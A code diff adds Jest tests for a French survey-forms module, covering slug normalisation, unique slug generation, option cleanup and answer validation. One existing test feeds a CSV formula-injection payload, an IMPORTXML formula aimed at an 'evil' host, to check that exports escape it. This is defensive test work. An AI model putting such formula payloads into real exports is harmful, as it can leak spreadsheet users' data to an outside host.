@@ -6,7 +6,11 @@ import {
   buildSurveyFormSnapshot,
   csvEscapeSurveyValue,
   isSurveyFormExpired,
+  normalizeSurveyFormPayload,
+  normalizeSurveyOptions,
   questionCatalogWithSnapshots,
+  resolveUniqueSurveySlug,
+  surveySlugCandidate,
   validateSurveyAnswer,
 } from '../../server/src/forms/forms.utils';
 import {
@@ -130,6 +134,36 @@ describe('Formulaires v2 — schémas et permissions', () => {
 });
 
 describe('Formulaires v2 — helpers service sans DB', () => {
+  it('normalise les slugs publics saisis avec accents, espaces ou ponctuation avant validation service', () => {
+    expect(normalizeSurveyFormPayload({ title: 'Événement d’été 2026', slug: ' Événement d’été 2026 !!! ' })).toMatchObject({
+      slug: 'evenement-d-ete-2026',
+    });
+    expect(normalizeSurveyFormPayload({ title: 'Diagnostic membre', slug: '' })).toMatchObject({
+      slug: 'diagnostic-membre',
+    });
+    expect(normalizeSurveyFormPayload({ slug: 'é' })).toMatchObject({ slug: 'e' });
+  });
+
+  it('génère une URL unique stable en cas de doublon de slug', async () => {
+    const taken = new Set(['diagnostic', 'diagnostic-2', 'diagnostic-3']);
+    await expect(resolveUniqueSurveySlug('Diagnostic', async (candidate) => taken.has(candidate))).resolves.toBe('diagnostic-4');
+    await expect(resolveUniqueSurveySlug('Nouveau formulaire', async (candidate) => taken.has(candidate))).resolves.toBe('nouveau-formulaire');
+    expect(surveySlugCandidate('x'.repeat(160), 12).length).toBeLessThanOrEqual(120);
+    expect(surveySlugCandidate('x'.repeat(160), 12)).toMatch(/-12$/);
+  });
+
+  it('normalise les options et refuse les questions à choix avec moins de deux options', () => {
+    expect(normalizeSurveyOptions([' Oui ', '', { label: 'Non' }, { label: 'Peut-être' }])).toEqual([
+      { label: 'Oui', value: 'oui' },
+      { label: 'Non', value: 'non' },
+      { label: 'Peut-être', value: 'peut-etre' },
+    ]);
+
+    expect(() => assertSurveyQuestionsCanBeSaved('published', [
+      { label: 'Choix unique', type: 'radio', required: true, options: [{ label: 'Seule option', value: 'only' }] },
+    ])).toThrow(BadRequestException);
+  });
+
   it('protège les exports CSV contre formula injection', () => {
     expect(csvEscapeSurveyValue('=IMPORTXML("https://evil")')).toBe('"\'=IMPORTXML(""https://evil"")"');
     expect(csvEscapeSurveyValue('+SUM(A1:A2)')).toBe("'+SUM(A1:A2)");
@@ -197,15 +231,19 @@ describe('Formulaires v2 — helpers service sans DB', () => {
     expect(validateSurveyAnswer(question({
       type: 'multiselect',
       options: [{ label: 'A', value: 'a' }, { label: 'B', value: 'b' }],
-    }), ['a', 'b'])).toEqual(['a', 'b']);
+    }), ['a', 'b', 'a'])).toEqual(['a', 'b']);
+    expect(validateSurveyAnswer(question({ type: 'date' }), '2026-07-01')).toBe('2026-07-01');
   });
 
-  it('refuse les réponses hors options et notes hors limites', () => {
+  it('refuse les réponses hors options, notes hors limites et confirmations obligatoires non cochées', () => {
     expect(() => validateSurveyAnswer(question({
       type: 'select',
       options: [{ label: 'A', value: 'a' }],
     }), 'b')).toThrow(BadRequestException);
 
     expect(() => validateSurveyAnswer(question({ type: 'rating' }), 6)).toThrow(BadRequestException);
+    expect(() => validateSurveyAnswer(question({ type: 'checkbox', required: true }), false)).toThrow(BadRequestException);
+    expect(() => validateSurveyAnswer(question({ type: 'date' }), 'pas-une-date')).toThrow(BadRequestException);
+    expect(() => validateSurveyAnswer(question({ type: 'date' }), '2026-02-31')).toThrow(BadRequestException);
   });
 });
